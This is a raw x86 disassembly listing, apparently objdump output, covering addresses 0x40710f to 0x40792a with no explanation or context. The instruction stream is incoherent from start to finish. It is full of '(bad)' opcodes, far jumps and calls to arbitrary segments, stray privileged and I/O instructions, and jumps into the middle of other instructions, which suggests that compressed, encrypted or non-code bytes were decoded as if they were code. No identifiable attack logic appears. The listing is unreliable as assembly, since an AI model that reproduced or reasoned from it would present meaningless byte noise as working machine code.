  40710f:	shl    DWORD PTR [eax-0x70],cl
  407112:	xchg   BYTE PTR [eax+0x17],ch
  407115:	adc    edi,DWORD PTR es:[edi-0x4d]
  407119:	mov    ebx,0xbd2a0b8
  40711e:	(bad)  
  40711f:	push   cs
  407120:	pop    eax
  407121:	mov    dl,0xc0
  407123:	fnsave [edx]
  407125:	adc    WORD PTR [esp+ebp*8-0x37411d9a],di
  40712d:	repz pop ds
  40712f:	sbb    cl,BYTE PTR [edi]
  407131:	sub    ch,0xcf
  407134:	mov    ecx,0xbd1f060d
  407139:	adc    al,0x7a
  40713b:	xchg   ebp,eax
  40713c:	dec    edx
  40713d:	inc    edi
  40713e:	loopne 0x407121
  407140:	pop    edi
  407141:	jmp    eax
  407143:	add    eax,0xf98f50be
  407148:	add    al,0xfa
  40714a:	push   es
  40714b:	int    0xa5
  40714d:	jge    0x407196
  40714f:	mov    ebp,0xa9eb5c3a
  407154:	cmp    eax,0xe382ee40
  407159:	call   0x8d4b:0x24e8a21c
  407160:	xlat   BYTE PTR ds:[ebx]
  407161:	push   edi
  407162:	fistp  QWORD PTR [ebx]
  407164:	mov    ah,0xd2
  407166:	sub    DWORD PTR [edx],0x24
  407169:	jl     0x40715b
  40716b:	into   
  40716c:	inc    eax
  40716d:	mov    ah,0x73
  40716f:	xor    al,0x47
  407171:	daa    
  407172:	mov    cl,0x7e
  407174:	in     eax,0x8c
  407176:	inc    esi
  407177:	pop    es
  407178:	hlt    
  407179:	retf   
  40717a:	push   ecx
  40717b:	adc    DWORD PTR [ecx+0x562bbdd6],edi
  407181:	lods   al,BYTE PTR ds:[esi]
  407182:	sbb    dh,bh
  407184:	pop    es
  407185:	sub    al,0x2d
  407188:	mov    ebx,0x720072b5
  40718d:	push   ebp
  40718e:	pop    ebp
  40718f:	pusha  
  407190:	pop    ss
  407191:	dec    ebp
  407192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407193:	aaa    
  407194:	push   es
  407195:	xchg   cl,cl
  407197:	mov    ch,0x23
  407199:	mov    bh,0xcd
  40719b:	daa    
  40719c:	xchg   ecx,eax
  40719d:	mov    eax,ds:0x558dc97
  4071a2:	cmp    edx,edx
  4071a4:	mov    al,ds:0x8fa6c85d
  4071a9:	scas   al,BYTE PTR es:[edi]
  4071aa:	adc    al,0xc4
  4071ac:	pop    ebx
  4071ad:	dec    eax
  4071ae:	in     al,dx
  4071af:	fs xchg edx,esi
  4071b2:	add    al,0xfe
  4071b4:	add    ah,BYTE PTR [eax+0x7c]
  4071b7:	sub    BYTE PTR [esi+0x17],dl
  4071ba:	inc    edi
  4071bb:	fstp   DWORD PTR [ebp+0x26]
  4071be:	pop    edi
  4071bf:	and    esp,edi
  4071c1:	fst    QWORD PTR [ecx]
  4071c3:	fldenv [esi-0x6a33563e]
  4071c9:	call   0xa8aa:0x36443307
  4071d0:	dec    ebp
  4071d1:	fs pop ecx
  4071d3:	retf   0x8181
  4071d6:	jge    0x407255
  4071d8:	sbb    dh,BYTE PTR [ecx-0x52fa2cf6]
  4071de:	push   edi
  4071df:	ret    
  4071e0:	jbe    0x407242
  4071e2:	loope  0x4071f5
  4071e4:	idiv   DWORD PTR [ebx]
  4071e6:	jae    0x407244
  4071e8:	jmp    0xda4a:0x9112c129
  4071ef:	repz jae 0x4071c1
  4071f2:	sbb    BYTE PTR [edi-0x1896ce91],ch
  4071f8:	(bad)  
  4071f9:	(bad)
  4071fc:	les    ecx,FWORD PTR ds:0xec0bf662
  407202:	repnz test eax,0x8377f4d0
  407208:	mov    dl,0x73
  40720a:	push   edx
  40720b:	lea    edi,[edx]
  40720d:	or     bl,BYTE PTR [ebx-0x5c]
  407210:	cmp    DWORD PTR [bp+di+0x14],esi
  407214:	dec    edx
  407215:	adc    BYTE PTR [esi+0x7],bh
  407218:	or     al,0x6e
  40721a:	sub    cl,dh
  40721c:	aaa    
  40721d:	leave  
  40721e:	repz stc 
  407220:	xlat   BYTE PTR ds:[ebx]
  407221:	sub    al,0x46
  407223:	lahf   
  407224:	mov    eax,ds:0x17d16abd
  407229:	xor    ah,BYTE PTR [ebp+edi*8-0x1502b86e]
  407230:	scas   eax,DWORD PTR es:[edi]
  407231:	stos   DWORD PTR es:[edi],eax
  407232:	pop    ebp
  407233:	cmp    eax,0x2e0dee3f
  407238:	inc    edi
  407239:	fdecstp 
  40723b:	sti    
  40723c:	dec    esp
  40723d:	jg     0x4072aa
  40723f:	jmp    0xf55f:0xd51b37db
  407246:	leave  
  407247:	jecxz  0x4071f4
  407249:	vpandn ymm0,ymm0,ymm7
  40724d:	stc    
  40724e:	js     0x407280
  407250:	cld    
  407251:	repz sub BYTE PTR [ebx+0x7f],ch
  407255:	pop    eax
  407256:	push   0xeb8e4605
  40725b:	ss add eax,0x28ed5556
  407261:	and    al,0x8e
  407263:	sbb    DWORD PTR [esi-0x53],edi
  407266:	or     BYTE PTR [esi-0x76],ch
  407269:	xor    eax,0xf0de90c8
  40726e:	xchg   esi,eax
  40726f:	sti    
  407270:	jmp    0x40722e
  407272:	test   DWORD PTR [ebp+0x71],ebp
  407275:	cdq    
  407276:	call   0xd08cf4a3
  40727b:	mov    bl,ch
  40727d:	stos   DWORD PTR es:[edi],eax
  40727e:	dec    esi
  40727f:	ds (bad) 
  407282:	fcom   QWORD PTR ds:0xc3099316
  407288:	data16 std 
  40728a:	jo     0x407277
  40728c:	cmp    dl,BYTE PTR [ecx]
  40728e:	or     DWORD PTR [ebx-0x7c],edi
  407291:	push   DWORD PTR [edi+0x2b970da7]
  407297:	jmp    0x634b:0x9baed68d
  40729e:	lods   al,BYTE PTR ds:[esi]
  40729f:	mov    ch,0x56
  4072a1:	out    dx,eax
  4072a2:	cld    
  4072a3:	or     BYTE PTR [ebx+ebp*2-0x121ea689],al
  4072aa:	retf   0x7a94
  4072ad:	xor    DWORD PTR [esi],0xb2634c75
  4072b3:	sub    DWORD PTR [esi-0x23],ebp
  4072b6:	popa   
  4072b7:	mov    cl,0x9c
  4072b9:	mov    ss,edx
  4072bb:	sbb    esp,edi
  4072bd:	in     eax,0x82
  4072bf:	fisttp DWORD PTR [esi+0x71cf1bc]
  4072c5:	mov    ebx,0xcea7fe9e
  4072ca:	inc    esp
  4072cb:	mov    cl,0x21
  4072cd:	cmp    ebx,DWORD PTR [edi-0x4f8e688]
  4072d3:	sbb    eax,0x7c130a06
  4072d8:	sub    al,0xbe
  4072da:	ja     0x407324
  4072dc:	mov    eax,DWORD PTR [edi+0x26]
  4072df:	sub    DWORD PTR [edx+eax*8],edi
  4072e2:	dec    eax
  4072e3:	cmp    DWORD PTR [edx],esp
  4072e5:	sub    DWORD PTR [eax+0x12],eax
  4072e8:	mul    DWORD PTR [esi+ebx*8+0x43]
  4072ec:	or     BYTE PTR ds:0xeba2d75a,dh
  4072f2:	rcr    BYTE PTR [eax+0x72b2995e],cl
  4072f8:	mov    ?,WORD PTR [eax+0x71447bec]
  4072fe:	or     al,0xe5
  407300:	adc    esi,DWORD PTR [eax+ecx*8-0x6d]
  407304:	fdiv   DWORD PTR [ebx+0x45]
  407307:	lds    esi,FWORD PTR [esi]
  407309:	dec    edi
  40730a:	cdq    
  40730b:	das    
  40730c:	dec    edi
  40730d:	or     eax,0x8dd9933c
  407312:	std    
  407313:	je     0x4072a6
  407315:	cmp    cl,al
  407317:	inc    esi
  407318:	push   ebx
  407319:	dec    eax
  40731a:	gs mov ch,0xba
  40731d:	push   eax
  40731e:	xor    ch,BYTE PTR [ebp-0x4bb23be4]
  407324:	add    eax,0xaf599a0e
  407329:	into   
  40732a:	clc    
  40732b:	cmp    ecx,DWORD PTR [esi+0x708b0b4f]
  407331:	push   0x65
  407333:	aad    0x27
  407335:	lds    edx,FWORD PTR [esi-0x4ee3a3c1]
  40733b:	xor    al,0x91
  40733d:	or     ch,bh
  40733f:	dec    ebp
  407340:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407341:	pop    es
  407342:	enter  0xdb95,0x77
  407346:	js     0x4072ca
  407348:	icebp  
  407349:	sub    DWORD PTR [ecx-0x5f8ba41f],eax
  40734f:	addr16 inc eax
  407351:	xchg   ecx,eax
  407352:	jmp    0xa01b8de7
  407357:	pop    eax
  407358:	out    0x8,al
  40735a:	pop    ss
  40735b:	xor    al,0x2d
  40735d:	dec    edx
  40735e:	xchg   DWORD PTR [ebp+ebp*2+0x3d6758fa],edi
  407365:	in     eax,dx
  407366:	push   esp
  407367:	retf   
  407368:	xchg   DWORD PTR [ecx*2+0x76b491f],edx
  40736f:	sub    BYTE PTR [eax+0x6e],bh
  407372:	xchg   DWORD PTR [edx-0xcb5022a],edi
  407378:	out    dx,eax
  407379:	adc    DWORD PTR [edx-0x65],esp
  40737c:	in     eax,0x8c
  40737e:	pop    esp
  40737f:	mov    al,0x7
  407381:	shl    BYTE PTR [eax-0x13ffff00],0xe8
  407388:	outs   dx,DWORD PTR ds:[esi]
  407389:	cs enter 0x3953,0x85
  40738e:	imul   esp,DWORD PTR [edx-0x30],0x916526c4
  407395:	cmp    dh,BYTE PTR [eax+0x68ec9f2b]
  40739b:	icebp  
  40739c:	fldenv [edx-0x4a]
  40739f:	push   ds
  4073a0:	ret    
  4073a1:	adc    dl,BYTE PTR [ebx]
  4073a3:	ror    DWORD PTR [edx],0xa5
  4073a6:	mov    dh,0x2c
  4073a8:	inc    ebx
  4073a9:	(bad)  
  4073aa:	or     DWORD PTR [esi-0x7acae386],eax
  4073b0:	das    
  4073b1:	jno    0x407352
  4073b3:	es xor edi,esi
  4073b6:	inc    edi
  4073b7:	xchg   BYTE PTR [edi],ch
  4073b9:	jnp    0x40741e
  4073bb:	jmp    0xfdff:0x68cc0d44
  4073c2:	push   es
  4073c3:	rcr    eax,0x90
  4073c6:	dec    edx
  4073c7:	cs (bad) 
  4073c9:	jns    0x40742d
  4073cb:	in     eax,dx
  4073cc:	xor    al,0x75
  4073ce:	mov    edi,0x7ad6ecf1
  4073d3:	sbb    al,0xfe
  4073d5:	xchg   BYTE PTR [ebp-0x4ccfa2af],bh
  4073db:	mov    bl,0xe2
  4073dd:	clc    
  4073de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073df:	jp     0x4073c6
  4073e1:	push   eax
  4073e2:	imul   ecx,ebp,0xffffffef
  4073e5:	(bad)  
  4073e6:	call   0xa934d58c
  4073eb:	jne    0x40741b
  4073ed:	inc    ebx
  4073ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ef:	mov    edx,0x4ff20131
  4073f4:	test   BYTE PTR [ebx-0x7a751c4e],bh
  4073fa:	and    edi,DWORD PTR es:[edx+0x14]
  4073fe:	dec    ecx
  4073ff:	inc    edx
  407400:	and    esp,DWORD PTR [eax+esi*1-0x2c]
  407404:	cmp    DWORD PTR [ecx],0xffffffd9
  407407:	popa   
  407408:	and    eax,0x6f19638
  40740d:	mov    eax,ds:0xad9cdd20
  407412:	loopne 0x40744b
  407414:	push   ebx
  407415:	cwde   
  407416:	stc    
  407417:	in     eax,dx
  407418:	xlat   BYTE PTR ds:[ebx]
  407419:	lds    ecx,FWORD PTR [esi+0x5b3266f7]
  40741f:	jge    0x4073c5
  407421:	(bad)  
  407422:	pop    esp
  407423:	sub    eax,0x40f9d703
  407428:	inc    ebp
  407429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40742a:	sub    DWORD PTR [eax-0x63b2a031],ebp
  407430:	cs ins BYTE PTR es:[edi],dx
  407432:	clc    
  407433:	pop    DWORD PTR [ebx-0x40bbf2bc]
  407439:	in     al,0x26
  40743b:	retf   
  40743c:	push   esi
  40743d:	and    ah,BYTE PTR [esi-0x77]
  407440:	sbb    DWORD PTR [edi],ebp
  407442:	ficomp WORD PTR [eax+edi*1]
  407445:	pop    edi
  407446:	adc    ebp,DWORD PTR [eax+edx*8-0x5df5dc02]
  40744d:	jnp    0x407469
  40744f:	imul   eax,DWORD PTR [ebx-0x1aad545c],0x45
  407456:	arpl   WORD PTR [edx+0x6ce6b7ed],bp
  40745c:	xor    DWORD PTR [edi+0x28993b6d],edi
  407462:	daa    
  407463:	retf   0xbf0c
  407466:	jg     0x4074b5
  407468:	or     BYTE PTR [edx+0x21775340],dh
  40746e:	inc    esp
  40746f:	add    cl,BYTE PTR [eax]
  407471:	sbb    ebp,esi
  407473:	pop    edx
  407474:	xor    eax,0x126b4932
  407479:	int3   
  40747a:	inc    edi
  40747b:	aas    
  40747c:	mov    ebp,DWORD PTR [eax+ebp*4+0x62a25d70]
  407483:	mov    dh,0xc8
  407485:	push   ecx
  407486:	jmp    0x4074df
  407488:	int    0x39
  40748a:	popf   
  40748b:	mov    bl,0xfe
  40748d:	gs dec ebp
  40748f:	enter  0x37d8,0xfc
  407493:	mov    esi,0xee4d6b6
  407498:	and    eax,DWORD PTR [ebx-0x9a4de74]
  40749e:	mov    WORD PTR [edx-0x231e648],ds
  4074a4:	mov    ds:0x67e4e566,al
  4074a9:	data16 xor al,0x5f
  4074ac:	ja     0x4074af
  4074ae:	jecxz  0x40743b
  4074b0:	mov    DWORD PTR [edx],edx
  4074b2:	call   0xb70820db
  4074b7:	jno    0x4074be
  4074b9:	stos   DWORD PTR es:[edi],eax
  4074ba:	les    edi,FWORD PTR [ebp-0x38]
  4074bd:	sbb    DWORD PTR [edx+0x555193be],esp
  4074c3:	outs   dx,DWORD PTR ds:[esi]
  4074c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c5:	inc    ebx
  4074c6:	push   ds
  4074c7:	in     eax,0xa8
  4074c9:	inc    ebx
  4074ca:	outs   dx,BYTE PTR ds:[esi]
  4074cb:	int3   
  4074cc:	mov    edx,0xb97ce911
  4074d1:	retf   0x2574
  4074d4:	popf   
  4074d5:	push   ebp
  4074d6:	jmp    0x40753f
  4074d8:	push   ebx
  4074d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074da:	call   0x8b45:0x5cc3fc80
  4074e1:	(bad)  
  4074e2:	test   BYTE PTR gs:[edx],0x5a
  4074e6:	pop    ebp
  4074e7:	ror    BYTE PTR [esi+0x15af8acb],0xf6
  4074ee:	xchg   ebx,eax
  4074ef:	push   ss
  4074f0:	or     edi,ecx
  4074f2:	inc    esi
  4074f3:	imul   edi,ecx,0x662c63f8
  4074f9:	popf   
  4074fa:	(bad)  
  4074fb:	outs   dx,DWORD PTR ss:[esi]
  4074fd:	in     eax,0x1c
  4074ff:	aad    0xb8
  407501:	xchg   edx,eax
  407502:	sbb    ah,cl
  407504:	inc    edx
  407505:	call   0xf0d6:0x5ff74f99
  40750c:	and    eax,DWORD PTR [eax-0x28753ccd]
  407512:	cwde   
  407513:	sbb    eax,0x3ce5aba
  407518:	jge    0x40754a
  40751a:	stc    
  40751b:	nop
  40751c:	xor    eax,0xd5595b89
  407521:	xchg   ecx,eax
  407522:	daa    
  407523:	mov    ebx,0x9b9baef5
  407528:	jns    0x4075a0
  40752a:	inc    ecx
  40752b:	adc    DWORD PTR [ebp-0x3],edi
  40752e:	enter  0xf0fa,0xb
  407532:	fst    DWORD PTR [ecx]
  407534:	dec    eax
  407535:	sub    DWORD PTR [esi],eax
  407537:	adc    BYTE PTR [esp+edx*2-0x2bc884bd],dh
  40753e:	dec    edx
  40753f:	inc    esi
  407540:	sbb    DWORD PTR [ecx],edi
  407542:	jmp    0x407598
  407544:	push   es
  407545:	in     al,dx
  407546:	lock and bl,BYTE PTR [ebp+0x1309c34d]
  40754d:	and    eax,0xf4e0249e
  407552:	(bad)  
  407553:	int    0xe2
  407555:	retf   
  407556:	hlt    
  407557:	shl    BYTE PTR [edx+edx*2-0x4f40eacd],0x85
  40755f:	std    
  407560:	test   al,0xb4
  407562:	cmc    
  407563:	into   
  407564:	add    al,0x99
  407566:	push   esi
  407567:	sti    
  407568:	ret    0x1015
  40756b:	add    BYTE PTR [edi],0x8b
  40756e:	xor    BYTE PTR [edi+0x5a681e24],ah
  407574:	mov    ch,0x8c
  407576:	or     eax,0x78f73800
  40757b:	mov    ah,0x4a
  40757d:	sub    DWORD PTR [ebp-0x7a],esp
  407580:	lock ins BYTE PTR es:[edi],dx
  407582:	test   ah,ch
  407584:	cmp    BYTE PTR [edx+0x2561f9c3],ch
  40758a:	pop    ebx
  40758b:	sahf   
  40758c:	mov    ah,0x87
  40758e:	icebp  
  40758f:	or     DWORD PTR [edx+0x711d4b82],ebx
  407595:	and    BYTE PTR [edi-0x7d],bh
  407598:	ret    0xcbc6
  40759b:	and    al,0xe8
  40759d:	rcr    DWORD PTR ds:0xd5260f7,cl
  4075a3:	dec    eax
  4075a4:	pop    esi
  4075a5:	fcmove st,st(3)
  4075a7:	inc    esi
  4075a8:	xchg   esp,eax
  4075a9:	test   BYTE PTR [eax],al
  4075ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ac:	mov    dl,0x12
  4075ae:	dec    edi
  4075af:	cld    
  4075b0:	cmp    al,0xd5
  4075b2:	aaa    
  4075b3:	mov    ch,0x98
  4075b5:	or     al,0x87
  4075b7:	mov    ds:0x282784f4,eax
  4075bc:	add    DWORD PTR [ecx-0xb0596c0],esp
  4075c2:	inc    edi
  4075c3:	jno    0x4075c2
  4075c5:	push   0x78
  4075c7:	mov    edi,0x49e09284
  4075cc:	mov    ch,0xc9
  4075ce:	add    al,0x58
  4075d0:	(bad)  
  4075d1:	into   
  4075d2:	into   
  4075d3:	push   edx
  4075d4:	test   BYTE PTR [ebx],ch
  4075d6:	fistp  DWORD PTR [esi-0x4c34be36]
  4075dc:	pop    esp
  4075dd:	fnstenv [ebx]
  4075df:	(bad)  
  4075e0:	leave  
  4075e1:	repz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4075e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075e5:	imul   edx,DWORD PTR [edx+edi*2-0x63cdd8c2],0x13
  4075ed:	mov    BYTE PTR [ecx-0x43968a45],bh
  4075f3:	std    
  4075f4:	xchg   esp,eax
  4075f5:	aam    0xad
  4075f7:	(bad)  [eax-0x40a64836]
  4075fd:	push   0x242d2b28
  407602:	jge    0x4075bb
  407604:	xor    al,0x2
  407606:	ret    0x88c5
  407609:	mov    ah,0x97
  40760b:	dec    esp
  40760c:	jg     0x4075bc
  40760e:	sbb    al,al
  407610:	jle    0x407652
  407612:	test   cl,bl
  407614:	pop    ss
  407615:	add    esp,ebx
  407617:	cmp    DWORD PTR [ebx+0x2d],0xd5a285bc
  40761e:	(bad)  
  40761f:	jmp    FWORD PTR ds:[ecx-0x18]
  407623:	mov    ecx,0x90898f5
  407628:	test   eax,0xafc7c8ca
  40762d:	dec    esi
  40762e:	dec    ebx
  40762f:	pop    ds
  407630:	dec    ebp
  407631:	not    BYTE PTR [esi]
  407633:	pop    ss
  407634:	or     DWORD PTR [ecx+0x45d26310],esp
  40763a:	test   eax,0xc3a39db6
  40763f:	inc    edx
  407640:	dec    esi
  407641:	xor    dh,BYTE PTR [ebx-0x4adac925]
  407647:	add    BYTE PTR [edx-0x1b],ch
  40764a:	fcom   QWORD PTR [edx+0x7b]
  40764d:	ficomp DWORD PTR [ebp+0x613b399d]
  407653:	icebp  
  407654:	popf   
  407655:	out    0x7c,al
  407657:	fsub   st,st(1)
  407659:	mov    eax,ds:0x71e50005
  40765e:	dec    ebx
  40765f:	mov    cs:0xe5fff42a,eax
  407665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407666:	mov    dl,0x5a
  407668:	jb     0x40766a
  40766a:	gs jo  0x407644
  40766d:	leave  
  40766e:	outs   dx,DWORD PTR ds:[esi]
  40766f:	push   ds
  407670:	stos   DWORD PTR es:[edi],eax
  407671:	rol    cl,1
  407673:	test   eax,0xb410f46a
  407678:	mov    eax,0x582f3dd2
  40767d:	not    ch
  40767f:	xchg   ebp,eax
  407680:	mov    bl,0xf
  407682:	and    BYTE PTR [edi+0x3],cl
  407685:	inc    BYTE PTR [edx+0x29]
  407688:	stc    
  407689:	hlt    
  40768a:	aad    0x57
  40768c:	pop    esi
  40768d:	(bad)  
  40768e:	cli    
  40768f:	int3   
  407690:	lods   eax,DWORD PTR ds:[esi]
  407691:	mov    esi,0xdb080d9
  407696:	sahf   
  407697:	mov    edx,0xe85598d1
  40769c:	dec    ebp
  40769d:	cmp    ebp,DWORD PTR [esi+eax*4+0x61cd9008]
  4076a4:	inc    ecx
  4076a5:	scas   eax,DWORD PTR es:[edi]
  4076a6:	jo     0x407678
  4076a8:	outs   dx,BYTE PTR ds:[esi]
  4076a9:	xor    BYTE PTR [ecx-0x5f],bl
  4076ac:	and    DWORD PTR [edx-0x7e],ebp
  4076af:	popf   
  4076b0:	fstp   QWORD PTR [edx+0xc]
  4076b3:	test   eax,0xff29fed1
  4076b8:	mov    al,0x73
  4076ba:	retf   0x162d
  4076bd:	(bad)  
  4076be:	aas    
  4076bf:	dec    esp
  4076c0:	mov    ds:0x5f8c8fd0,eax
  4076c5:	add    ch,ch
  4076c7:	cwde   
  4076c8:	jno    0x40767f
  4076ca:	ds retf 
  4076cc:	sub    bl,ch
  4076ce:	(bad)  
  4076cf:	cwde   
  4076d0:	(bad)  
  4076d1:	jne    0x407737
  4076d3:	addr16 inc ebp
  4076d5:	lahf   
  4076d6:	or     DWORD PTR [edx-0x3a],esi
  4076d9:	rcr    DWORD PTR [ebx+0x28],0xf7
  4076dd:	sbb    al,0x5d
  4076df:	xchg   edi,eax
  4076e0:	xchg   esp,eax
  4076e1:	pop    ss
  4076e2:	xor    al,0xc4
  4076e4:	lahf   
  4076e5:	lods   eax,DWORD PTR ds:[esi]
  4076e6:	fsubr  QWORD PTR [ebx-0x6]
  4076e9:	stc    
  4076ea:	dec    edx
  4076eb:	push   0xd89f427b
  4076f0:	ins    DWORD PTR es:[edi],dx
  4076f1:	xor    edi,0xd8e82d77
  4076f7:	push   eax
  4076f8:	cmp    BYTE PTR ds:[esi-0x7b7ae17e],bh
  4076ff:	push   ebx
  407700:	rol    DWORD PTR ds:0xec09503a,0xd1
  407707:	clc    
  407708:	inc    ebp
  407709:	rol    DWORD PTR [ecx+0x27ec2b68],1
  40770f:	test   eax,0xfd510368
  407714:	inc    esi
  407715:	test   DWORD PTR [edx-0x22adb487],0x1090e1ff
  40771f:	lea    esp,[eax+0x642d61f9]
  407725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407726:	shr    bh,0x76
  407729:	dec    eax
  40772a:	push   esi
  40772b:	call   DWORD PTR [ebp-0x7e]
  40772e:	and    ch,BYTE PTR [eax-0x77c9709]
  407734:	mov    eax,0xd778b355
  407739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40773a:	(bad)  
  40773b:	mov    ecx,0x419f624b
  407740:	mov    ah,0xca
  407742:	mov    ecx,DWORD PTR [ebp-0xecaead8]
  407748:	jg     0x40779d
  40774a:	and    eax,0x214fc42c
  40774f:	in     eax,dx
  407750:	adc    esi,esi
  407752:	dec    edx
  407753:	mov    edx,0xaa1fb6a7
  407758:	adc    ecx,DWORD PTR [ecx-0x5f]
  40775b:	test   eax,0xee777602
  407760:	or     al,0x96
  407762:	bnd jge 0x40777f
  407765:	dec    esp
  407766:	mov    ebp,0xd61a712
  40776b:	xor    al,BYTE PTR [ebx-0x64]
  40776e:	call   0x96f0a8ca
  407773:	xor    al,0x12
  407775:	aad    0xae
  407777:	mov    cs,ebp
  407779:	mov    BYTE PTR [eax],ch
  40777b:	dec    edi
  40777c:	into   
  40777d:	pushf  
  40777e:	out    dx,al
  40777f:	inc    eax
  407780:	add    al,BYTE PTR [esi-0x1a]
  407783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407784:	loopne 0x407718
  407786:	xchg   bl,bl
  407788:	hlt    
  407789:	shl    BYTE PTR [edi+0x7],cl
  40778c:	mov    ss,edx
  40778e:	fild   WORD PTR [ebx-0x77]
  407791:	pop    es
  407792:	ins    BYTE PTR es:[edi],dx
  407793:	sahf   
  407794:	in     al,dx
  407795:	pop    edx
  407796:	xchg   esp,eax
  407797:	nop
  407798:	sbb    eax,0xe28073ab
  40779d:	mov    dl,0xc7
  40779f:	jmp    0xdd5c1fd9
  4077a4:	in     eax,dx
  4077a5:	ds (bad) 
  4077a7:	and    eax,0xfac2f17a
  4077ac:	jne    0x40779b
  4077ae:	cld    
  4077af:	xchg   esp,eax
  4077b0:	sbb    esp,DWORD PTR [ebp-0x57927382]
  4077b6:	les    ecx,FWORD PTR [ecx+0x22]
  4077b9:	out    0x9a,al
  4077bb:	mov    es,edi
  4077bd:	xor    al,0x6a
  4077bf:	mov    dh,0x7d
  4077c1:	inc    ebx
  4077c2:	fild   QWORD PTR [ebx+edx*1+0x4c]
  4077c6:	sub    al,0xf2
  4077c8:	not    BYTE PTR [esi-0x6d]
  4077cb:	dec    esp
  4077cc:	fisttp QWORD PTR [ebp+0x50de1a5d]
  4077d2:	cwde   
  4077d3:	dec    edi
  4077d4:	push   es
  4077d5:	mov    edx,0x7d28adab
  4077da:	mov    dh,0x33
  4077dc:	pop    esi
  4077dd:	stos   BYTE PTR es:[edi],al
  4077de:	jle    0x4077fb
  4077e0:	call   0x86e6b0fb
  4077e5:	sub    DWORD PTR [ebp-0x27d0e7e],ecx
  4077eb:	inc    edx
  4077ec:	jmp    0xca2c:0xb439eb6e
  4077f3:	sahf   
  4077f4:	retf   0x7683
  4077f7:	hlt    
  4077f8:	mov    dl,0xf5
  4077fa:	retf   
  4077fb:	sub    BYTE PTR [esi+0x5c1ab4a7],ah
  407801:	push   ebp
  407802:	sar    DWORD PTR [ecx+0x2693e7d7],cl
  407808:	sbb    al,0x47
  40780a:	cmc    
  40780b:	mov    DWORD PTR [edx-0x14],esp
  40780e:	xor    BYTE PTR [ebx+0x55169de6],ah
  407814:	add    eax,0xe371e0cd
  407819:	loopne 0x407881
  40781b:	or     eax,0xca9d8cd3
  407820:	scas   eax,DWORD PTR es:[edi]
  407821:	sti    
  407822:	jne    0x4077dc
  407824:	push   ecx
  407825:	inc    ebx
  407826:	into   
  407827:	dec    ebx
  407828:	cld    
  407829:	out    0x11,al
  40782b:	rcr    DWORD PTR [esi],1
  40782d:	int3   
  40782e:	sub    BYTE PTR [edi],bh
  407830:	mov    bh,0xe
  407832:	sub    edi,0x8d355ae6
  407838:	test   al,0xc0
  40783a:	push   0xfe759797
  40783f:	ins    BYTE PTR es:[edi],dx
  407840:	cld    
  407841:	out    0x4d,al
  407843:	in     al,dx
  407844:	inc    ebx
  407845:	ja     0x4077e9
  407847:	test   al,0x1b
  407849:	jae    0x407802
  40784b:	test   al,0x7b
  40784d:	pop    ecx
  40784e:	arpl   WORD PTR [ebp-0x2ea82190],si
  407854:	retf   
  407855:	stos   DWORD PTR es:[edi],eax
  407856:	ss jb  0x407881
  407859:	push   ds
  40785a:	pop    ds
  40785b:	loopne 0x4078d2
  40785d:	(bad)  
  40785f:	gs mov eax,0xeac782c4
  407865:	xor    DWORD PTR [ecx],0xffffffaf
  407868:	mov    al,0xf7
  40786a:	adc    ch,bl
  40786c:	test   bl,0xdb
  40786f:	fldcw  WORD PTR [ebx-0x65647305]
  407875:	inc    ebx
  407876:	mov    ch,0xb1
  407878:	jecxz  0x4078be
  40787a:	stos   DWORD PTR es:[edi],eax
  40787b:	and    BYTE PTR [ebp-0x1c],0xe0
  40787f:	fcmovnu st,st(6)
  407881:	or     eax,0x86642804
  407886:	xor    dl,bl
  407888:	jbe    0x4078a0
  40788a:	adc    cl,BYTE PTR [edi]
  40788c:	lock outs dx,DWORD PTR ds:[esi]
  40788e:	cli    
  40788f:	adc    eax,0x7dad8ca3
  407894:	pop    edx
  407895:	mov    esp,0xde7e1537
  40789a:	push   edx
  40789b:	or     bl,BYTE PTR [di]
  40789e:	lea    eax,[eax+0x42]
  4078a1:	pop    ds
  4078a2:	je     0x407874
  4078a4:	(bad)  
  4078a7:	inc    eax
  4078a8:	adc    BYTE PTR [eax+0x1660f7e6],cl
  4078ae:	sbb    DWORD PTR [edx+0x24b97127],ebp
  4078b4:	mov    cl,0xb9
  4078b6:	fld    DWORD PTR [ebp+0x372403]
  4078bc:	mov    edx,0x80db37d9
  4078c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c2:	push   ds
  4078c3:	xabort 0xb0
  4078c6:	and    ch,bh
  4078c8:	sti    
  4078c9:	xchg   BYTE PTR [ecx+edx*2-0x3a0720b9],bl
  4078d0:	push   0xffffff97
  4078d2:	push   ebp
  4078d3:	jae    0x4078b3
  4078d5:	call   0x6bdd150b
  4078da:	xor    eax,ebp
  4078dc:	mov    eax,cs:0x7edaf1b8
  4078e2:	adc    al,0x13
  4078e4:	call   0x9f71:0xdccc24d2
  4078eb:	pmaddwd mm6,QWORD PTR ds:0x56ad5646
  4078f2:	out    0x9d,eax
  4078f4:	test   BYTE PTR [edi+esi*2+0x3a3a2e8d],0xb1
  4078fc:	xchg   BYTE PTR [eax-0x56],ch
  4078ff:	inc    edx
  407900:	push   esp
  407901:	in     eax,0xe3
  407903:	jae    0x40793c
  407905:	cmp    ebx,ebp
  407907:	fadd   DWORD PTR [edi-0x58c9d138]
  40790d:	add    eax,0x4fa6e679
  407912:	mov    ebx,0xa5f4c7ef
  407917:	pop    edi
  407918:	out    dx,al
  407919:	or     ah,al
  40791b:	retf   0xc996
  40791e:	xchg   esi,eax
  40791f:	pop    ss
  407920:	push   ss
  407921:	pop    ecx
  407922:	xlat   BYTE PTR ds:[ebx]
  407923:	xchg   ebp,eax
  407924:	mov    WORD PTR [ecx],fs
  407926:	and    edx,DWORD PTR ds:[edi-0x26]
  40792a:	xchg   ecx,eax
